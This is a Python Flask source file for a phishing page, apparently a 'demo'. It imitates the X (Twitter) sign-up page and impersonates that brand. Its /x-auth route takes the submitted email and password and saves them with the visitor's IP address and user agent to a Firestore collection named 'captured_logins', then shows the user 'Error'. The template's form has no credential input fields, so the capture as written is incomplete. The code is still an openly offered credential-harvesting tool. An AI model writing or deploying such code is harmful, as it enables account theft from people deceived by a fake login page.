import json
import os
import firebase_admin
from firebase_admin import credentials, firestore
import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
# Firebase setup
cred = None

# 1. Vercel production: credentials from env var
firebase_json_str = os.environ.get('FIREBASE_CREDENTIALS')
if firebase_json_str:
    try:
        cred_dict = json.loads(firebase_json_str)
        cred = credentials.Certificate(cred_dict)
    except json.JSONDecodeError as e:
        print(f"Error parsing FIREBASE_CREDENTIALS: {e}")
    except Exception as e:
        print(f"Firebase credential error: {e}")

# 2. Local testing fallback (use your downloaded JSON file)
if cred is None:
    # Change this path to where YOU saved the JSON file
    local_json_path = r"C:\Users\Mohit\Downloads\mohit-x-phish-demo-firebase-adminsdk-abc123-xyz.json"
    try:
        cred = credentials.Certificate(local_json_path)
    except Exception as e:
        print(f"Local Firebase key error: {e}")

# Initialize if credentials were loaded
if cred:
    firebase_admin.initialize_app(cred)
    db = firestore.client()
    print("Firestore initialized successfully")
else:
    print("WARNING: Firestore NOT initialized - no credentials found")
    db = None  # or handle gracefully

X_PHISHING_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .main-container {
            max-width: 500px;
            width: 100%;
            padding: 40px 20px;
            text-align: center;
        }
        .x-logo {
            font-size: 220px;
            font-weight: 900;
            letter-spacing: -15px;
            line-height: 0.75;
            margin-bottom: 60px;
            color: #fff;
        }
        h1 {
            font-size: 60px;
            font-weight: 800;
            margin-bottom: 12px;
        }
        h2 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 50px;
        }
        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 380px;
            margin: 12px auto;
            padding: 16px 24px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 9999px;
            border: none;
            cursor: pointer;
            transition: background 0.15s;
        }
        .btn-google {
            background: #fff;
            color: #000;
        }
        .btn-google:hover { background: #f0f0f0; }
        .btn-apple {
            background: #fff;
            color: #000;
        }
        .btn-apple:hover { background: #f0f0f0; }
        .btn-create {
            background: #1d9bf0;
            color: white;
        }
        .btn-create:hover { background: #1a8cd8; }
        .or {
            margin: 24px 0;
            font-size: 15px;
            color: #71767b;
            font-weight: 500;
        }
        .legal {
            margin-top: 40px;
            font-size: 13px;
            color: #71767b;
            line-height: 1.5;
        }
        .legal a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .legal a:hover { text-decoration: underline; }
        .already {
            margin-top: 60px;
            font-size: 17px;
            color: #e7e9ea;
        }
        .already a {
            color: #1d9bf0;
            font-weight: 700;
            text-decoration: none;
        }
        .grok {
            margin-top: 80px;
            font-size: 15px;
            color: #71767b;
        }
        .grok a {
            color: #1d9bf0;
            font-weight: 700;
            text-decoration: none;
        }
        @media (max-width: 500px) {
            .x-logo { font-size: 160px; letter-spacing: -10px; margin-bottom: 40px; }
            h1 { font-size: 48px; }
            h2 { font-size: 28px; }
            .btn { max-width: 90%; }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="x-logo">X</div>
        <h1>Happening now</h1>
        <h2>Join today.</h2>

        <button class="btn btn-google">G Sign up with Google</button>
        <button class="btn btn-apple">Sign up with Apple</button>

        <div class="or">OR</div>

        <form action="/x-auth" method="post">
            <button type="submit" class="btn btn-create">Create account</button>
        </form>

        <div class="legal">
            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>,  
            including <a href="#">Cookie Use</a>.
        </div>

        <div class="already">
            Already have an account? <a href="#">Sign in</a>
        </div>

        <div class="grok">
            <a href="#">Get Grok</a>
        </div>
    </div>
</body>
</html>
'''
@app.route('/')
def index():
    return render_template_string(X_PHISHING_TEMPLATE)

@app.route('/x-auth', methods=['POST'])
def authenticate():
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()

    if email and password:
        if db is None:
            print("DB not initialized - skipping save")
        else:
            try:
                print(f"Attempting to save: {email}")
                doc_ref = db.collection('captured_logins').document()
                doc_ref.set({
                    'email': email,
                    'password': password,
                    'timestamp': firestore.SERVER_TIMESTAMP,
                    'ip': request.remote_addr or 'unknown',
                    'user_agent': request.headers.get('User-Agent', 'unknown')
                })
                print(f"Successfully saved login for {email}")
            except Exception as e:
                print(f"Firestore save FAILED: {str(e)}")
    else:
        print("Empty credentials - not saving")

    return "Error"